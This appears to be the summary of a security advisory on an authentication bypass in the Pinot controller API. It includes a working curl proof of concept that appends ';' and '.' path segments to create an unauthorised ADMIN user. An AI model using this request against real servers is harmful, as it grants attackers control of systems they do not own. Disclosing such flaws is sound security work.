summary: "Authentication Bypass Issue\n\nIf the path does not contain / and contain., authentication\
  \ is not required.\n\nExpected Normal Request and Response Example\n\ncurl -X POST -H \"Content-Type:\
  \ application/json\" -d {\\\"username\\\":\\\"hack2\\\",\\\"password\\\":\\\"hack\\\",\\\"\
  component\\\":\\\"CONTROLLER\\\",\\\"role\\\":\\\"ADMIN\\\",\\\"tables\\\":[],\\\"permissions\\\
  \":[],\\\"usernameWithComponent\\\":\\\"hack_CONTROLLER\\\"}  http://{server_ip}:9000/users\
  \ \n\n\nReturn: {\"code\":401,\"error\":\"HTTP 401 Unauthorized\"}\n\n\nMalicious Request\
  \ and Response Example \n\ncurl -X POST -H \"Content-Type: application/json\" -d '{\\\"username\\\
  \":\\\"hack\\\",\\\"password\\\":\\\"hack\\\",\\\"component\\\":\\\"CONTROLLER\\\",\\\"role\\\
  \":\\\"ADMIN\\\",\\\"tables\\\":[],\\\"permissions\\\":[],\\\"usernameWithComponent\\\":\\\
  \"hack_CONTROLLER\\\"}'  http://{serverip}:9000/users; http://{serverip}:9000/users; .\n\n\
  \nReturn: {\"users\":{}}\n\n\n\n \n\nA new user gets added bypassing authentication, enabling\
  \ the user to control Pinot."
